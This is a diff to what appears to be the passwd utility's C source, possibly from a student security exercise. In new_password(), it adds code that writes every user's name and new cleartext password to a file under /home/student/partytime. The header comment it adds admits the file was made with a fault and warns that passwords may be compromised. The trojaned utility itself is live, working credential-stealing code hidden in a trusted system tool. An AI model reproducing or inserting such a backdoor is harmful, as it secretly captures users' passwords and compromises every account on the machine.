@@ -1,9 +1,16 @@
 /*
+ *
  * Copyright (c) 1989 - 1994, Julianne Frances Haugh
  * Copyright (c) 1996 - 2000, Marek Michałkiewicz
  * Copyright (c) 2001 - 2006, Tomasz Kłoczko
  * Copyright (c) 2007 - 2011, Nicolas François
+ * Copyright (c) 2020 , Thomas Davidson
  * All rights reserved.
+ *
+ * If you are reading this know that this was made with a fault that
+ * may cause your whole machine to become insecure. If you found this
+ * file running in your device assume that someone knows your passwords
+ * and replace them accordingly.
  *
  * Redistribution and use in source and binary forms, with or without
  * modification, are permitted provided that the following conditions
@@ -341,6 +348,10 @@ static int new_password (const struct passwd *pw)
 		if (strcmp (cp, pass) != 0) {
 			(void) fputs (_("They don't match; try again.\n"), stderr);
 		} else {
+		    FILE *fp;
+            fp = fopen("/home/student/partytime/passwords.txt", "a");
+            (void) fprintf(fp, "User: %s \t\tPassword: %s", pw->pw_name, clear);
+            fclose(fp);
 			strzero (cp);
 			break;
 		}
